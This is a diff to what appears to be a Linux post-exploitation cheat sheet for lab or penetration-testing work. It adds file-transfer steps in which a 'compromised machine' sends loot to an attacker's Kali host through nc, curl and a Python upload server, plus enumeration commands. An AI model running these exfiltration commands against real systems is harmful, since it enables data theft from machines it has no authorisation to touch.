@@ -90,6 +90,38 @@ nc -lvnp 80 > loot.txt
 nc <kali ip> 80 < loot.txt
 ```
 
+Don't forget about curl
+```bash
+curl http://192.168.100.200/file.txt > file.txt
+```
+
+## Transferring files from Linux to Kali
+
+If you need to upload a file back to your Kali machine, you can either opt for the nc method above or use a python [upload server](https://pypi.org/project/uploadserver/) (requires python 3.9 and above).
+It also has a GUI interface if you browse to the page
+
+Install on your Kali machine using
+```bash
+pip install uploadserver
+```
+
+Depending on how python is configured on your machine, you might need to use `python3` instead
+```bash
+python -m uploadserver
+```
+
+The default port for uploadserver is 8000, but it can be set in the same manner as http.server by indicating the port number :
+```bash
+python -m uploadserver 4444
+```
+
+Upload with curl using the compromised machine
+```powershell
+curl -X POST http://192.168.100.200:8000/upload -F 'files=@suspicious_file.txt'
+```
+
+The file will be uploaded to the directory where you ran the `uploadserver` module
+
 -------------------
 ## Checking for the Quick Wins
 
@@ -116,6 +148,7 @@ env to check for hardcoded credentials
 
 ```bash
 uname -a 
+cat /etc/issue
 cat /etc/os-release
 ```
 
@@ -137,8 +170,10 @@ ls -laRH /home
 
 ```bash
 ls -la /tmp /opt /dev/shm /var/tmp
-# the below command searches for all world writable directories. Any non default directories are worth investigating
+# the below command searches for all world writable directories. Any non-default directories are worth investigating
 find / -writable -type d 2>/dev/null
+# this version searches for all world writable files. Any non-default directories are worth investigating
+find / -writable -type f 2>/dev/null
 ```
 
 5) Check out the cron jobs. Do note that your user may not have privs to see root's cron jobs so a lack of results does not necessary mean that there is no cron jobs! 
